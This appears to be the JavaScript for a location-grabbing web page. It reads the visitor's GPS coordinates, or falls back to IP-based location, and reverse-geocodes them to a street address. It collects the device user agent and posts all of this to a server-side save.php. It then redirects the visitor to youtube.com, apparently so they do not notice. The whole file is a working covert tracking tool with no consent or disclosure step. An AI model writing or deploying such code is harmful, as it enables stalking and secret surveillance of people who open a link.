async function getIPInfo() {
  const res = await fetch('https://ipapi.co/json/');
  return await res.json();
}

function showMap(lat, lon) {
  const map = document.getElementById("map");
  map.innerHTML = `<iframe width="100%" height="100%" frameborder="0" style="border:0"
    src="https://www.google.com/maps?q=${lat},${lon}&hl=es;z=14&output=embed" allowfullscreen></iframe>`;
}

function logLocation(data, callback) {
  fetch("save.php", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  }).then(callback);
}

function getDeviceInfo() {
  return navigator.userAgent;
}

function fallbackIP() {
  getIPInfo().then(data => {
    const info = {
      source: "IP-Based",
      ip: data.ip,
      city: data.city,
      region: data.region,
      country: data.country_name,
      org: data.org,
      device: getDeviceInfo(),
      time: new Date().toISOString(),
      mapLink: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
    };
    document.getElementById("status").innerText = "📍 IP-Based Location Fallback";
    document.getElementById("details").innerText = JSON.stringify(info, null, 2);
    logLocation(info, () => {
      window.location.href = "https://youtube.com";
    });
  });
}

navigator.geolocation.getCurrentPosition(position => {
  const { latitude, longitude, accuracy } = position.coords;
  showMap(latitude, longitude);

  fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`)
    .then(res => res.json())
    .then(loc => {
      const info = {
        source: "GPS",
        lat: latitude,
        lon: longitude,
        accuracy: accuracy + " meters",
        address: loc.display_name,
        device: getDeviceInfo(),
        time: new Date().toISOString(),
        mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`
      };
      document.getElementById("status").innerText = "📍 GPS Location Found";
      document.getElementById("details").innerText = JSON.stringify(info, null, 2);
      logLocation(info, () => {
        window.location.href = "https://youtube.com";
      });
    });
}, fallbackIP);
